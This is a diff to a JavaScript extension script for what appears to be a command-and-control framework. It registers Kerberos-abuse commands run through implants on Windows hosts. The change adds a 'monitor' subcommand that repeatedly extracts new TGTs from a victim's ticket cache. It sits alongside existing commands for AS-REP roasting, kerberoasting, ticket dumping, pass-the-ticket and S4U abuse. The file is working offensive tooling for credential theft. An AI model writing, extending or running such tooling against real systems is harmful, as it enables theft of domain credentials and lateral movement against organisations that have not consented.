@@ -3,6 +3,22 @@ var metadata = {
     description: "Kerberos Exploitation BOFs"
 };
 
+
+let _cmd_monitor = ax.create_command("monitor", "Monitor Kerberos cache for new TGTs and extract them automatically", "kerbeus monitor /interval:30 /runtime:300");
+_cmd_monitor.addArgString("params", "Args: [/interval:SECONDS] [/runtime:SECONDS]  (defaults: interval=30, runtime=300)", "");
+_cmd_monitor.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let params = parsed_json["params"] || "";
+
+    let bof_params = ax.bof_pack("cstr", [params]);
+    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/monitor." + ax.arch(id) + ".o";
+
+    ax.execute_alias(id, cmdline, `execute bof -a "${bof_path}" ${bof_params}`, "Task: Kerbeus MONITOR");
+});
+
+
+
+
+
 let _cmd_asreproasting = ax.create_command("asreproasting", "Perform AS-REP roasting", "kerbeus asreproasting /user:pre_user");
 _cmd_asreproasting.addArgString("params", true, "Args: /user:USER [/dc:DC] [/domain:DOMAIN]");
 _cmd_asreproasting.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
@@ -180,7 +196,7 @@ _cmd_triage.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
 });
 
 var cmd_kerbeus = ax.create_command("kerbeus", "Kerberos abuse (kerbeus BOF)");
-cmd_kerbeus.addSubCommands([_cmd_asreproasting, _cmd_asktgt, _cmd_asktgs, _cmd_changepw, _cmd_dump, _cmd_hash, _cmd_kerberoasting, _cmd_klist, _cmd_ptt, _cmd_describe, _cmd_purge, _cmd_renew, _cmd_s4u, _cmd_cross_s4u, _cmd_tgtdeleg, _cmd_triage]);
+cmd_kerbeus.addSubCommands([_cmd_asreproasting, _cmd_monitor, _cmd_asktgt, _cmd_asktgs, _cmd_changepw, _cmd_dump, _cmd_hash, _cmd_kerberoasting, _cmd_klist, _cmd_ptt, _cmd_describe, _cmd_purge, _cmd_renew, _cmd_s4u, _cmd_cross_s4u, _cmd_tgtdeleg, _cmd_triage]);
 
 var group_kerbeus = ax.create_commands_group("Kerbeus-BOF", [cmd_kerbeus]);
 ax.register_commands_group(group_kerbeus, ["beacon", "gopher", "kharon"], ["windows"], []);
